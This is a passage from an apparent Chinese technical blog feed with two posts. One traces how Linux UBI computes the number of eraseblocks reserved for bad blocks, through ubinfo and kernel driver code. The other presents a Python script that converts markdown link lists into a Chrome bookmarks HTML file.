    printf(&quot;\n&quot;);

    printf(&quot;Total amount of logical eraseblocks:     %d (&quot;, dev_info.total_lebs);
    util_print_bytes(dev_info.total_bytes, 0);
    printf(&quot;)\n&quot;);

    printf(&quot;Amount of available logical eraseblocks: %d (&quot;, dev_info.avail_lebs);
    util_print_bytes(dev_info.avail_bytes, 0);
    printf(&quot;)\n&quot;);

    printf(&quot;Maximum count of volumes                 %d\n&quot;, dev_info.max_vol_count);
    printf(&quot;Count of bad physical eraseblocks:       %d\n&quot;, dev_info.bad_count);
    printf(&quot;Count of reserved physical eraseblocks:  %d\n&quot;, dev_info.bad_rsvd);
    printf(&quot;Current maximum erase counter value:     %lld\n&quot;, dev_info.max_ec);
    printf(&quot;Minimum input/output unit size:          %d %s\n&quot;,
           dev_info.min_io_size, dev_info.min_io_size &gt; 1 ? &quot;bytes&quot; : &quot;byte&quot;);
    printf(&quot;Character device major/minor:            %d:%d\n&quot;,
           dev_info.major, dev_info.minor);

    if (dev_info.vol_count == 0)
        return 0;

    printf(&quot;Present volumes:                         &quot;);
    for (i = dev_info.lowest_vol_id;
         i &lt;= dev_info.highest_vol_id; i++) {
        err = ubi_get_vol_info1(libubi, dev_info.dev_num, i, &amp;vol_info);
        if (err == -1) {
            if (errno == ENOENT)
                continue;

            return sys_errmsg(&quot;libubi failed to probe volume %d on ubi%d&quot;,
                      i, dev_info.dev_num);
        }

        if (!first)
            printf(&quot;, %d&quot;, i);
        else {
            printf(&quot;%d&quot;, i);
            first = 0;
        }
    }
    printf(&quot;\n&quot;);

    if (!all)
        return 0;

    first = 1;
    printf(&quot;\n&quot;);

    for (i = dev_info.lowest_vol_id;
         i &lt;= dev_info.highest_vol_id; i++) {
        if(!first)
            printf(&quot;-----------------------------------\n&quot;);
        err = ubi_get_vol_info1(libubi, dev_info.dev_num, i, &amp;vol_info);
        if (err == -1) {
            if (errno == ENOENT)
                continue;

            return sys_errmsg(&quot;libubi failed to probe volume %d on ubi%d&quot;,
                      i, dev_info.dev_num);
        }
        first = 0;

        err = print_vol_info(libubi, dev_info.dev_num, i);
        if (err)
            return err;
    }

    return 0;
}
</code></pre>
<p>ref: <a href="http://git.infradead.org/mtd-utils.git/blob/639b871fe3d2cb3e73d21363e8c13ede2bbd9f99:/ubi-utils/ubinfo.c" target="_blank" rel="noopener">http://git.infradead.org/mtd-utils.git/blob/639b871fe3d2cb3e73d21363e8c13ede2bbd9f99:/ubi-utils/ubinfo.c</a></p>
<p>打印保留size的是下面这一行，对应变量<code>dev_info.bad_rsvd</code></p>
<pre><code class="c">printf(&quot;Count of reserved physical eraseblocks:  %d\n&quot;, dev_info.bad_rsvd);
</code></pre>
<h3 id="追踪-bad-rsvd"><a href="#追踪-bad-rsvd" class="headerlink" title="追踪 bad_rsvd"></a>追踪 bad_rsvd</h3><p>根据 <code>dev_info.bad_rsvd</code> 这个变量可以逐步逆向追溯到信息来源</p>
<p><img src="/assets/linux/get-bad_rsvd.png" alt="print_dev_info 函数调用关系"></p>
<p>从以上函数调用关系可以看出，饶了一大圈，实际上就是读了个文件里的值，没错，这个值就是存在<code>/sys/class/ubi/ubi0/reserved_for_bad</code>文件里</p>
<pre><code class="sh">root:/sys/devices/virtual/ubi/ubi0# ls
avail_eraseblocks  max_ec             reserved_for_bad   ubi0_2
bad_peb_count      max_vol_count      subsystem          ubi0_3
bgt_enabled        min_io_size        total_eraseblocks  ubi0_4
dev                mtd_num            ubi0_0             uevent
eraseblock_size    power              ubi0_1             volumes_count
root:/sys/devices/virtual/ubi/ubi0# cat reserved_for_bad
20
</code></pre>
<p>在目录<code>/sys/class/ubi/ubi0</code>下还可以看到其它ubi信息，比如avail_eraseblocks（可用块）, bad_peb_count（坏块个数）等。</p>
<p>好啦，用户空间就到这吧，我们已经搞清楚了<code>ubinfo -a</code>的信息来源是系统目录下的文件，当然我们也可以很容易猜到这些文件是系统内核产生的，确切的说是UBI驱动程序产生的。</p>
<h2 id="内核空间"><a href="#内核空间" class="headerlink" title="内核空间"></a>内核空间</h2><p>接下来看内核空间的UBI驱动部分，查找底层驱动是如何计算坏块保留大小的。</p>
<p>根据开机过程的UBI log，在linux内核的<code>drivers/mtd/ubi/</code>目录grep搜索相关字符串（如&quot;PEBs reserved for bad PEB handling&quot;），可以找到打印这些log的函数<code>ubi_attach_mtd_dev</code>.</p>
<h3 id="ubi-attach-mtd-dev"><a href="#ubi-attach-mtd-dev" class="headerlink" title="ubi_attach_mtd_dev"></a>ubi_attach_mtd_dev</h3><p>该函数用于附加MTD device到UBI并分配@ubi_num给新创建的UBI设备，在附加过程中会打印UBI设备的相关信息，也就是<a href="#UBI-attach">UBI attach</a>部分的console log.</p>
<pre><code class="c">int ubi_attach_mtd_dev(struct mtd_info *mtd, int ubi_num,
            int vid_hdr_offset, int max_beb_per1024)
{
  struct ubi_device *ubi;
  int i, err, ref = 0;

  /*省略部分代码*/

  ubi_msg(&quot;attached mtd%d (name \&quot;%s\&quot;, size %llu MiB) to ubi%d&quot;,
     mtd-&gt;index, mtd-&gt;name, ubi-&gt;flash_size &gt;&gt; 20, ubi_num);
  ubi_msg(&quot;PEB size: %d bytes (%d KiB), LEB size: %d bytes&quot;,
     ubi-&gt;peb_size, ubi-&gt;peb_size &gt;&gt; 10, ubi-&gt;leb_size);
  ubi_msg(&quot;min./max. I/O unit sizes: %d/%d, sub-page size %d&quot;,
     ubi-&gt;min_io_size, ubi-&gt;max_write_size, ubi-&gt;hdrs_min_io_size);
  ubi_msg(&quot;VID header offset: %d (aligned %d), data offset: %d&quot;,
     ubi-&gt;vid_hdr_offset, ubi-&gt;vid_hdr_aloffset, ubi-&gt;leb_start);
  ubi_msg(&quot;good PEBs: %d, bad PEBs: %d, corrupted PEBs: %d&quot;,
     ubi-&gt;good_peb_count, ubi-&gt;bad_peb_count, ubi-&gt;corr_peb_count);
  ubi_msg(&quot;user volume: %d, internal volumes: %d, max. volumes count: %d&quot;,
     ubi-&gt;vol_count - UBI_INT_VOL_COUNT, UBI_INT_VOL_COUNT,
     ubi-&gt;vtbl_slots);
  ubi_msg(&quot;max/mean erase counter: %d/%d, WL threshold: %d, image sequence number: %u&quot;,
     ubi-&gt;max_ec, ubi-&gt;mean_ec, CONFIG_MTD_UBI_WL_THRESHOLD,
     ubi-&gt;image_seq);
  ubi_msg(&quot;available PEBs: %d, total reserved PEBs: %d, PEBs reserved for bad PEB handling: %d&quot;,
     ubi-&gt;avail_pebs, ubi-&gt;rsvd_pebs, ubi-&gt;beb_rsvd_pebs);

  /*省略部分代码*/
}
</code></pre>
<p>ref: <a href="https://elixir.bootlin.com/linux/v3.14.77/source/drivers/mtd/ubi/build.c#L867" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v3.14.77/source/drivers/mtd/ubi/build.c#L867</a></p>
<p>从函数可以看到打印坏块保留分区的语句：</p>
<pre><code class="c">ubi_msg(&quot;available PEBs: %d, total reserved PEBs: %d, PEBs reserved for bad PEB handling: %d&quot;,
   ubi-&gt;avail_pebs, ubi-&gt;rsvd_pebs, ubi-&gt;beb_rsvd_pebs);
</code></pre>
<p>结合以下变量定义</p>
<pre><code class="c">/**
 * struct ubi_device - UBI device description structure
 * ...
 * @rsvd_pebs: count of reserved physical eraseblocks
 * @avail_pebs: count of available physical eraseblocks
 * @beb_rsvd_pebs: how many physical eraseblocks are reserved for bad PEB
 *                 handling
 * @beb_rsvd_level: normal level of PEBs reserved for bad PEB handling
 * ...
 */
</code></pre>
<p>ref: <a href="https://elixir.bootlin.com/linux/v3.14.77/source/drivers/mtd/ubi/ubi.h#L383" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v3.14.77/source/drivers/mtd/ubi/ubi.h#L383</a></p>
<p>可知变量<code>beb_rsvd_pebs</code>对应的就是为坏块预留的大小，<code>beb_rsvd_level</code>是坏块预留的常规等级，这两者有啥联系呢。OK，接下来要做的和用户空间一样，我们进行逆向追踪，看下这两个变量的值是如何获取的。</p>
<h3 id="追踪-beb-rsvd-pebs"><a href="#追踪-beb-rsvd-pebs" class="headerlink" title="追踪 beb_rsvd_pebs"></a>追踪 beb_rsvd_pebs</h3><p><img src="/assets/linux/get-beb_rsvd_pebs.png" alt="get beb_rsvd_pebs"></p>
<p>图中虚线代表非直接调用关系，虚线中间的全局变量代表的是两个节点的关联信息，捋一下：</p>
<ol>
<li>ubi_eba_init 调用 ubi_calculate_reserved 函数计算出 <code>beb_rsvd_level</code><ul>
<li>ubi_calculate_reserved 调用了 get_bad_peb_limit 获取 <code>bad_peb_limit</code></li>
<li>get_bad_peb_limit 调用了其它3个函数计算 <code>bad_peb_limit</code></li>
</ul>
</li>
<li>ubi_eba_init 将 <code>beb_rsvd_level</code> 赋值给 <code>beb_rsvd_level</code></li>
<li>ubi_attach_mtd_dev 将 <code>beb_rsvd_pebs</code> 打印到 console</li>
</ol>
<p>有点绕，没关系，下面按照箭头方向从下往上逐一细说。</p>
<h3 id="ubi-eba-init"><a href="#ubi-eba-init" class="headerlink" title="ubi_eba_init"></a>ubi_eba_init</h3><p><code>ubi_eba_init</code> 使用ubi信息初始化EBA子系统，但是这个我们不关心，主要看其中一小段代码。</p>
<pre><code class="c">int ubi_eba_init(struct ubi_device *ubi, struct ubi_attach_info *ai)
{
   /*省略部分代码*/

  if (ubi-&gt;bad_allowed) {
    ubi_calculate_reserved(ubi);

    if (ubi-&gt;avail_pebs &lt; ubi-&gt;beb_rsvd_level) {
      /* No enough free physical eraseblocks */
      ubi-&gt;beb_rsvd_pebs = ubi-&gt;avail_pebs;
      print_rsvd_warning(ubi, ai);
    } else
      ubi-&gt;beb_rsvd_pebs = ubi-&gt;beb_rsvd_level;

    ubi-&gt;avail_pebs -= ubi-&gt;beb_rsvd_pebs;
    ubi-&gt;rsvd_pebs  += ubi-&gt;beb_rsvd_pebs;
  }

   /*省略部分代码*/
}
</code></pre>
<p>在允许坏块，并且有足够PEBs的情况下, <code>beb_rsvd_pebs</code> 等于 <code>beb_rsvd_level</code></p>
<pre><code class="c">ubi-&gt;beb_rsvd_pebs = ubi-&gt;beb_rsvd_level;
</code></pre>
<p>ok，那接下来的问题是<code>beb_rsvd_level</code>如何得来，继续往下↓</p>
<h3 id="ubi-calculate-reserved"><a href="#ubi-calculate-reserved" class="headerlink" title="ubi_calculate_reserved"></a>ubi_calculate_reserved</h3><p>从上面的流程图可知，<code>beb_rsvd_level</code> 由 以下函数计算得到。</p>
<pre><code class="c">/**
 * ubi_calculate_reserved - calculate how many PEBs must be reserved for bad
 * eraseblock handling.
 * @ubi: UBI device description object
 */
void ubi_calculate_reserved(struct ubi_device *ubi)
{
  /*
   * Calculate the actual number of PEBs currently needed to be reserved
   * for future bad eraseblock handling.
   */
  ubi-&gt;beb_rsvd_level = ubi-&gt;bad_peb_limit - ubi-&gt;bad_peb_count;
  if (ubi-&gt;beb_rsvd_level &lt; 0) {
     ubi-&gt;beb_rsvd_level = 0;
     ubi_warn(&quot;number of bad PEBs (%d) is above the expected limit (%d), not reserving any PEBs for bad PEB handling, will use available PEBs (if any)&quot;,
        ubi-&gt;bad_peb_count, ubi-&gt;bad_peb_limit);
  }
}
</code></pre>
<p>这个函数的精髓就一行, <code>beb_rsvd_level</code> 等于坏块限制 <code>bad_peb_limit</code> 减去当前已检测到的坏块数量<code>bad_peb_count</code>.</p>
<pre><code class="c">ubi-&gt;beb_rsvd_level = ubi-&gt;bad_peb_limit - ubi-&gt;bad_peb_count;
</code></pre>
<p>由于检测到的坏块数量与硬件实际情况有关，我们不深究，接下来继续追溯 <code>bad_peb_limit</code> 的来源。</p>
<h3 id="get-bad-peb-limit"><a href="#get-bad-peb-limit" class="headerlink" title="get_bad_peb_limit"></a>get_bad_peb_limit</h3><p><code>get_bad_peb_limit</code> 就是用来计算坏块限制的函数，函数中有段注释，大致意思是我们不能保证坏块平均分摊在整个flash芯片，考虑最坏情况，有可能所有坏块都出现在附加了ubi的MTD分区。因此在计算限制大小时使用的是整个flash size.</p>
<pre><code class="c">static int get_bad_peb_limit(const struct ubi_device *ubi, int max_beb_per1024)
{
  int limit, device_pebs;
  uint64_t device_size;

  if (!max_beb_per1024)
     return 0;

  /*
   * Here we are using size of the entire flash chip and
   * not just the MTD partition size because the maximum
   * number of bad eraseblocks is a percentage of the
   * whole device and bad eraseblocks are not fairly
   * distributed over the flash chip. So the worst case
   * is that all the bad eraseblocks of the chip are in
   * the MTD partition we are attaching (ubi-&gt;mtd).
   */
  device_size = mtd_get_device_size(ubi-&gt;mtd);
  device_pebs = mtd_div_by_eb(device_size, ubi-&gt;mtd);
  limit = mult_frac(device_pebs, max_beb_per1024, 1024);

  /* Round it up */
  if (mult_frac(limit, 1024, max_beb_per1024) &lt; device_pebs)
     limit += 1;

  return limit;
}
</code></pre>
<p>这里用到3个函数：</p>
<ol>
<li><code>mtd_get_device_size</code> - 获取整个flash芯片的大小</li>
<li><code>mtd_div_by_eb</code> - 将flash大小换算成eraseblock个数，就是将Bytes单位换算为PEBs</li>
<li><code>mult_frac</code> - 分数相乘函数，把以PEB为单位的limit值乘以一个坏块系数</li>
</ol>
<p>前面两个函数都好理解，单独来看下<code>mult_frac</code>, 这其实是个宏定义，用于分数相乘。</p>
<pre><code class="c">/*
 * Multiplies an integer by a fraction, while avoiding unnecessary
 * overflow or loss of precision.
 */
#define mult_frac(x, numer, denom)( \
{ \
  typeof(x) quot = (x) / (denom); \
  typeof(x) rem  = (x) % (denom); \
  (quot * (numer)) + ((rem * (numer)) / (denom)); \
} \
)
</code></pre>
<p>举例说明，假设flash为128MB(134,217,728 Bytes), <code>get_bad_peb_limit</code>函数用到的<code>max_beb_per1024</code>来自于kernel config, 默认值为20，代表每1024 PEBs中最多允许20个坏块，那么对应的limit计算如下：</p>
<pre><code class="c">device_size = 134217728; /* flash size 128MB */
device_pebs = 134217728 / (128 * 1024) = 1024; /* eraseblock: 128KB */
limit = mult_frac(device_pebs, max_beb_per1024, 1024) = 1024 * (20 / 1024) = 20;
</code></pre>
<p>最终计算得到<code>bad_peb_limit</code>为20 PEBs, 与 <a href="#ubinfo-a">ubinfo -a</a> 中的结果一致。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文首先从 console log 入手分析了UBI相关配置信息，然后从用户空间和内核空间两个方面分析了UBI信息的来源以及坏块保留大小的计算. 其中坏块保留大小 <code>beb_rsvd_pebs</code> 的计算过程可以归结为：</p>
<pre><code class="c">/* get_bad_peb_limit */
device_size = mtd_get_device_size(ubi-&gt;mtd);
device_pebs = mtd_div_by_eb(device_size, ubi-&gt;mtd);
limit = mult_frac(device_pebs, max_beb_per1024, 1024);

ubi-&gt;bad_peb_limit = get_bad_peb_limit(ubi, max_beb_per1024);

/* ubi_calculate_reserved */
ubi-&gt;beb_rsvd_level = ubi-&gt;bad_peb_limit - ubi-&gt;bad_peb_count;

/* ubi_eba_init */
ubi-&gt;beb_rsvd_pebs = ubi-&gt;beb_rsvd_level;
</code></pre>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://elixir.bootlin.com/linux/v3.14.77/source/drivers/mtd/ubi" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v3.14.77/source/drivers/mtd/ubi</a></li>
<li><a href="http://git.infradead.org/mtd-utils.git" target="_blank" rel="noopener">http://git.infradead.org/mtd-utils.git</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> ubi </tag>
            
            <tag> flash </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python之markdown转Chrome收藏夹]]></title>
      <url>https://www.litreily.top/2020/05/03/md2bm/</url>
      <content type="html"><![CDATA[<p>网上可以搜到很多chrome收藏夹转markdown文档的方法，却鲜有markdown文档转为Chrome收藏夹的方法，不过这种需求也确实不多。我之所以用到，是因为平常会用markdown文档收集一些网站，现在想要转换为Chrome收藏夹，方便访问。</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>要实现这个功能倒也不难，因为Chrome的收藏夹本质上也是一个html文件，只不过有其固定的DOM结构而已，所以我们的实现思路很简单。</p>
<ol>
<li>导出Chrome已有的收藏夹</li>
<li>分析导出得到的html文件格式</li>
<li>将自己需要转成Chrome收藏夹的markdown按相同格式转换为html文件</li>
<li>在chrome中导入生成后的收藏夹</li>
</ol>
<h2 id="收藏夹的DOM结构"><a href="#收藏夹的DOM结构" class="headerlink" title="收藏夹的DOM结构"></a>收藏夹的DOM结构</h2><p>我导出了自己的收藏夹，取出其中一小部分为例进行分析，比较局部是可以反映整体的。</p>
<pre><code class="html">&lt;!DOCTYPE NETSCAPE-Bookmark-file-1&gt;
&lt;!-- This is an automatically generated file.
     It will be read and overwritten.
     DO NOT EDIT! --&gt;
&lt;META HTTP-EQUIV=&quot;Content-Type&quot; CONTENT=&quot;text/html; charset=UTF-8&quot;&gt;
&lt;TITLE&gt;Bookmarks&lt;/TITLE&gt;
&lt;H1&gt;Bookmarks&lt;/H1&gt;
&lt;DL&gt;&lt;p&gt;
    &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1499940499&quot; LAST_MODIFIED=&quot;1573567059&quot; PERSONAL_TOOLBAR_FOLDER=&quot;true&quot;&gt;Bookmarks bar&lt;/H3&gt;
    &lt;DL&gt;&lt;p&gt;
        &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1481956366&quot; LAST_MODIFIED=&quot;1565750292&quot;&gt;不常用&lt;/H3&gt;
        &lt;DL&gt;&lt;p&gt;
            &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1460906121&quot; LAST_MODIFIED=&quot;1582357904&quot;&gt;设计&lt;/H3&gt;
            &lt;DL&gt;&lt;p&gt;
                &lt;DT&gt;&lt;A HREF=&quot;https://w3layouts.com/&quot; ADD_DATE=&quot;1460906098&quot; ICON=&quot;data:image/png;base64,&quot;&gt;Free Responsive Mobile Website Templates Designs - w3layouts.com&lt;/A&gt;
                &lt;DT&gt;&lt;A HREF=&quot;http://www.hightopo.com/demos/index.html&quot; ADD_DATE=&quot;1472525305&quot; ICON=&quot;data:image/png;base64,&quot;&gt;Hightopo - Everything you need to create cutting-edge 2D and 3D visualization&lt;/A&gt;
                &lt;DT&gt;&lt;A HREF=&quot;http://jekyllthemes.org/&quot; ADD_DATE=&quot;1459860502&quot;&gt;Jekyll Themes&lt;/A&gt;
            &lt;/DL&gt;&lt;p&gt;
            &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1468076322&quot; LAST_MODIFIED=&quot;1538094516&quot;&gt;算法&lt;/H3&gt;
            &lt;DL&gt;&lt;p&gt;
                &lt;DT&gt;&lt;A HREF=&quot;http://www.pythontip.com/acm/problemCategory&quot; ADD_DATE=&quot;1468076332&quot; ICON=&quot;data:image/png;base64,&quot;&gt;各大OJ题目分类&lt;/A&gt;
                &lt;DT&gt;&lt;A HREF=&quot;http://www.acmerblog.com/&quot; ADD_DATE=&quot;1468075312&quot; ICON=&quot;data:image/png;base64,&quot;&gt;Acm之家&lt;/A&gt;
            &lt;/DL&gt;&lt;p&gt;
            &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1550926992&quot; LAST_MODIFIED=&quot;1582961771&quot;&gt;图标&lt;/H3&gt;
            &lt;DL&gt;&lt;p&gt;
                &lt;DT&gt;&lt;A HREF=&quot;https://www.emojicopy.com/&quot; ADD_DATE=&quot;1550926923&quot; ICON=&quot;data:image/png;base64,&quot;&gt;EmojiCopy | Simple emoji copy and paste by EmojiOne™&lt;/A&gt;
                &lt;DT&gt;&lt;A HREF=&quot;https://www.webfx.com/tools/emoji-cheat-sheet/&quot; ADD_DATE=&quot;1582961771&quot; ICON=&quot;data:image/png;base64,&quot;&gt;🎁 Emoji cheat sheet for GitHub, Basecamp, Slack &amp;amp; more&lt;/A&gt;
            &lt;/DL&gt;&lt;p&gt;
            &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1412991964&quot; LAST_MODIFIED=&quot;1586250269&quot;&gt;论坛&lt;/H3&gt;
            &lt;DL&gt;&lt;p&gt;
                &lt;DT&gt;&lt;A HREF=&quot;https://www.qt.io/&quot; ADD_DATE=&quot;1472370392&quot; ICON=&quot;data:image/png;base64,&quot;&gt;Qt&lt;/A&gt;
                &lt;DT&gt;&lt;A HREF=&quot;https://freessl.cn/&quot; ADD_DATE=&quot;1566824588&quot; ICON=&quot;data:image/png;base64,&quot;&gt;FreeSSL首页 - FreeSSL.cn 一个申请免费HTTPS证书的网站&lt;/A&gt;
            &lt;/DL&gt;&lt;p&gt;
        &lt;/DL&gt;&lt;p&gt;
        &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1538059196&quot; LAST_MODIFIED=&quot;1569229251&quot;&gt;wiki&lt;/H3&gt;
        &lt;DL&gt;&lt;p&gt;
            &lt;DT&gt;&lt;A HREF=&quot;https://code.woboq.org/linux/linux/&quot; ADD_DATE=&quot;1528874869&quot; ICON=&quot;data:image/png;base64,&quot;&gt;linux/linux/ Source Tree - Woboq Code Browser&lt;/A&gt;
            &lt;DT&gt;&lt;A HREF=&quot;https://www.geeksforgeeks.org/c-programming-language/&quot; ADD_DATE=&quot;1569229251&quot;&gt;C Programming Language - GeeksforGeeks&lt;/A&gt;
        &lt;/DL&gt;&lt;p&gt;
        &lt;DT&gt;&lt;A HREF=&quot;http://translate.google.cn/&quot; ADD_DATE=&quot;1446427265&quot; ICON=&quot;data:image/png;base64,&quot;&gt;&lt;/A&gt;
        &lt;DT&gt;&lt;A HREF=&quot;http://www.litreily.top/&quot; ADD_DATE=&quot;1481438786&quot; ICON=&quot;data:image/png;base64,&quot;&gt;&lt;/A&gt;
    &lt;/DL&gt;&lt;p&gt;
&lt;/DL&gt;&lt;p&gt;
</code></pre>
<p>以上DOM结构中，每条收藏都有一个<code>&lt;A&gt;</code>标签，该标签有一个base64值对应的是base64编码后的图标，也就是每个收藏的图标，这个不是必须的，为了方便阅读，我将其删除了，并不影响。</p>
<p>如果使用上面的html文件导入chrome的话，是下面这样的。</p>
<p><img src="/assets/chrome/example.png" alt="chrome bookmark"></p>
<p>注意其中两个收藏（谷歌翻译和我的博客主页）没有显示描述信息，这个在chrome中是允许的，因为根据图标就能知道这是什么站点。</p>
<p>好啦，对比DOM结构和在收藏夹的展示，不难发现规律：</p>
<ol>
<li>所有收藏夹中的文件夹无论在哪一个层级，都对应DOM中的一个<code>&lt;DT&gt;&lt;H3&gt;</code>标签</li>
<li><code>&lt;H3&gt;</code>标签包含属性：<code>ADD_DATE</code>, <code>LAST_MODIFIED</code></li>
<li>收藏夹中文件夹可以嵌套</li>
<li>每个<code>&lt;DT&gt;&lt;H3&gt;</code>标签都紧随着一组<code>&lt;DL&gt;&lt;p&gt;</code></li>
<li>每个<code>&lt;DL&gt;&lt;p&gt;</code>里都包含一个收藏列表</li>
<li>每条收藏都以<code>&lt;DT&gt;&lt;A&gt;</code>标签组合，对应收藏的链接</li>
<li><code>&lt;A&gt;</code>标签包含属性：<code>HREF</code>,<code>ADD_DATE</code>,<code>ICON</code></li>
</ol>
<p>到此就完成了对收藏夹的分析，下面就可以按照这个格式将markdown转换成相应的html</p>
<h2 id="markdown转html"><a href="#markdown转html" class="headerlink" title="markdown转html"></a>markdown转html</h2><p>markdown文档格式很简单，同样举例说明，下面是用markdown格式编写的收藏夹。</p>
<pre><code class="md"># 收藏夹(Favorites)

## 常用

- [谷歌翻译](http://translate.google.cn/)
- [litreily](http://www.litreily.top/)
- [Notes](https://litreily.gitbook.io/notes/content/)
- [smslit](http://www.smslit.top/)
- [github](https://github.com/)
- [coding](https://coding.net/user)

## 论坛(forum)

- [Coding 博客](https://blog.coding.net/)
- [图灵社区](http://www.ituring.com.cn/)
- [电子发烧友](http://www.elecfans.com/)

## 编程(Programming)

### 算法(Algorithm)

- [Acm之家](http://www.acmerblog.com/)
- [各大OJ题目分类](http://www.pythontip.com/acm/problemCategory)

### linux

- [linux - Elixir - Free Electrons](http://elixir.free-electrons.com/linux/latest/source)
</code></pre>
<p>我们使用Python对其逐行读取处理，处理策略如下：</p>
<ol>
<li>新建html文件favorites.html，添加HTML头部信息</li>
<li>获取当前系统时间作为收藏夹中所有的<code>LAST_MODIFIED</code>和<code>ADD_DATE</code></li>
<li>将所有以<code>#</code>开头的视为文件夹，添加<code>&lt;DT&gt;&lt;H3&gt;</code>标签，设置时间戳和文件夹名称</li>
<li>在<code>&lt;DT&gt;&lt;H3&gt;</code>标签后紧跟<code>&lt;DL&gt;&lt;p&gt;</code>标签</li>
<li>将所有链接替换为<code>&lt;DT&gt;&lt;A&gt;</code>格式，这个需要用到python的正则匹配和替换，非常方便</li>
<li>在合适的位置添加<code>&lt;/DL&gt;&lt;p&gt;</code>标签，用以封装<code>&lt;DL&gt;&lt;p&gt;</code></li>
</ol>
<p>使用该策略编写的Python脚本如下：</p>
<pre><code class="python">#!/usr/bin/env python3
# -*- coding:utf-8 -*-
# convert markdown to chrome bookmarks
# @author: litreily
# @date: 2020-04-25

import sys
import time
import re


TIMESTAMP = int(time.time())

HTML_HEAD = &quot;&quot;&quot;\
&lt;!DOCTYPE NETSCAPE-Bookmark&gt;
&lt;!-- This is an automatically generated file.
     It will be read and overwritten.
     DO NOT EDIT! --&gt;
&lt;META HTTP-EQUIV=&quot;Content-Type&quot; CONTENT=&quot;text/html; charset=UTF-8&quot;&gt;
&lt;TITLE&gt;Bookmarks&lt;/TITLE&gt;
&lt;H1&gt;Bookmarks&lt;/H1&gt;
&lt;DL&gt;&lt;p&gt;
&quot;&quot;&quot;.format(TIMESTAMP)
HTML_END = &quot;&quot;&quot;&lt;/DL&gt;&lt;p&gt;\n&quot;&quot;&quot;

GROUP_HEAD = &quot;&quot;&quot;\t&lt;DT&gt;&lt;H3 ADD_DATE=&quot;{ts}&quot; LAST_MODIFIED=&quot;{ts}&quot;&gt;{title}&lt;/H3&gt;
\t&lt;DL&gt;&lt;p&gt;
&quot;&quot;&quot;
GROUP_END = &quot;\t&lt;/DL&gt;&lt;p&gt;\n&quot;

MASK = &quot;&quot;&quot;\t&lt;DT&gt;\
&lt;A HREF=&quot;{link}&quot; ADD_DATE=&quot;{ts}&quot; ICON=&quot;data:image/png;base64,{icon}&quot;&gt;{title}&lt;/A&gt;
&quot;&quot;&quot;


def main(input):
    with open(input, &#39;r&#39;) as f:
        lists = f.readlines()

    # open html file to write into
    output = open(&#39;favorites.html&#39;, &#39;w&#39;)
    output.write(HTML_HEAD)

    group_re = re.compile(r&#39;^(#+) +(.*)$&#39;) # eg. ## network
    mask_re = re.compile(r&#39;\[(.*)\]\((.*)\)&#39;) # eg. [baidu](https://www.baidu.com)

    pre_H_level = 0 # previous Header level, H2 or H3 or ...
    for line in lists:
        line = line.strip()

        m = mask_re.search(line)
        if m:
            # find link
            output.write(MASK.format(link=m.group(2), ts=TIMESTAMP, icon=None, title=m.group(1)))
        else:
            m = group_re.search(line)
            if m:
                # find header
                cur_H_level = len(m.group(1)) # current Header level
                if cur_H_level &lt;= pre_H_level:
                    for _ in range(pre_H_level - cur_H_level + 1):
                        output.write(GROUP_END)
                pre_H_level = cur_H_level
                output.write(GROUP_HEAD.format(ts=TIMESTAMP, title=m.group(2)))
    output.write(HTML_END)

if __name__ == &quot;__main__&quot;:
    if len(sys.argv) &lt; 2:
        print(&#39;No input files.&#39;)
        sys.exit(1)
    main(sys.argv[1])
</code></pre>
<p>这个脚本唯一需要注意的一点是：什么时候添加<code>&lt;DL&gt;&lt;p&gt;</code>对应的<code>&lt;/DL&gt;&lt;p&gt;</code>闭合标签？如果在错误位置添加了或者是没添加，都会导致收藏夹嵌套顺序错乱。</p>
<p>对此我的思路是：对比前后两次markdown中读取到的HEADER层级，比如H2对应2，H3对应3. 前一次<code>pre_H_level</code>，当前<code>cur_H_level</code>，如果<code>cur_H_level</code> &lt;= <code>pre_H_level</code>就需要添加，而且添加个数等于前后两数之差加1.</p>
<p>举例说明：</p>
<pre><code class="md">## H2_1
...
### H3        # pre: H2, cur: H3. cur &gt; pre, 不加
...
## H2_2       # pre: H3, cur: H2, cur &lt; pre, 加(3-2+1)=2次
...
## H2_3       # pre: H2, cur: H2, cur = pre, 加(2-2+1)=1次
</code></pre>
<p>当然，这种做法的前提是markdown符合语法要求。</p>
<h2 id="导入chrome"><a href="#导入chrome" class="headerlink" title="导入chrome"></a>导入chrome</h2><p>使用以上脚本将markdown转换为html</p>
<pre><code class="sh">./md2bm test.md
</code></pre>
<pre><code class="html">&lt;!DOCTYPE NETSCAPE-Bookmark&gt;
&lt;!-- This is an automatically generated file.
     It will be read and overwritten.
     DO NOT EDIT! --&gt;
&lt;META HTTP-EQUIV=&quot;Content-Type&quot; CONTENT=&quot;text/html; charset=UTF-8&quot;&gt;
&lt;TITLE&gt;Bookmarks&lt;/TITLE&gt;
&lt;H1&gt;Bookmarks&lt;/H1&gt;
&lt;DL&gt;&lt;p&gt;
    &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1588501602&quot; LAST_MODIFIED=&quot;1588501602&quot;&gt;收藏夹(Favorites)&lt;/H3&gt;
    &lt;DL&gt;&lt;p&gt;
    &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1588501602&quot; LAST_MODIFIED=&quot;1588501602&quot;&gt;常用&lt;/H3&gt;
    &lt;DL&gt;&lt;p&gt;
    &lt;DT&gt;&lt;A HREF=&quot;http://translate.google.cn/&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;谷歌翻译&lt;/A&gt;
